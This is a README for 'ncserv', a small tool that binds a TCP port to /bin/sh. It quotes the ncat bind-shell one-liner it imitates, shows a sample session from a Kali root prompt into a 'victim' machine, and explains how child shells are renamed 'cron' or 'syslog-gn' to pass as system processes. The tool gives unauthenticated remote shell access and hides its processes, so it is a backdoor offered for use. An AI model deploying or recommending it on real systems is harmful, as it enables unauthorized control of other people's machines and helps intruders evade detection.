ncserv
======
ncserv does little more than connect a tcp stream to `/bin/sh`, much like the
cheesy rats made with `ncat -vklp 4444 -e '/bin/sh`.  It's handy for when
`ncat`, `nc`, `socat`, and the rest of the usual assortment of tricks
aren't available.  It also has the benefit of naming the child processes
something other than `/bin/sh`.

Please note that there is **absolutely zero encryption or authentication**, so
don't use anywhere this is a problem.

ncserv does not support Windows, yet.  Supporting Windows should be fairly
easy to do.  Please send a pull request if you get it working nicely.

Connecting
----------
Once ncserv is running, connect with `nc`, just as if the listener were `ncat`
or `socat` or whatever else.  Multiple concurrent connections are fine, as is
killing the shell with `kill -9 $$`.
Example:
```sh
[root@kali:~]$ nc victim 46098 
Connected.
uname -a
OpenBSD hacked.victim.foo 5.8 GENERIC.MP#0 amd64
w
10:09PM  up 17 days,  3:27, 1 user, load averages: 0.29, 0.14, 0.10
USER    TTY FROM              LOGIN@  IDLE WHAT
fred     p0 192.168.1.103    Mon05PM     0 tmux: client (/tmp/tmux-1000/default
```
Note that it's unlikely the remote host will print any sort of prompt.  The
text `Connected.` is sent by the victim and serves to indicate a successful
connection.

Examples
--------
Start a listener on a random port, use the default name (`cron`) for child
shells:
```sh
./ncserv
```
Listen on port 31337, call child processes `syslog-gn`:
```sh
./ncserv -a :31337 -n 'syslog-gn'
```

Usage
-----
```
Usage: ncserv [options]

Listens, passes connections to a shell.  Meant to be used when ncat, socat, and
so on are unavailable or undesirable.

Options:
  -a address
    	Listen address (default "0.0.0.0:0")
  -n name
    	Process name (default "cron")
```
